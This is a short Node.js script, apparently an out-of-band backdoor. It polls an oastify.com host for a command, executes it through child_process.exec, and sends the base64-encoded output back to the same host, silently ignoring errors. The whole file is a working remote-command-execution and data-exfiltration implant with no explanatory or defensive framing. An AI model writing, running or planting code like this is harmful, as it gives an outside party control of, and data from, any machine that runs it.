const http = require('http');
const { exec } = require('child_process');

const serverHost = 'o8xh1yfspo2co2jkgu0d9d6do4uvil6a.oastify.com'; 
const commandFetchPath = '/cmd';
const resultSendPath = '/result'; 
// Fetch the command from your server
http.get(`http://${serverHost}${commandFetchPath}`, (res) => {
  let data = '';

  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    exec(data.trim(), (err, stdout, stderr) => {
      const output = Buffer.from(err ? stderr : stdout).toString('base64');

      // Send the result back to your server (base64 encoded)
      const req = http.request({
        hostname: serverHost,
        path: `${resultSendPath}?out=${output}`,
        method: 'GET'
      }, res => {
        // Optional: log status
      });

      req.on('error', () => {});
      req.end();
    });
  });
}).on('error', () => {});
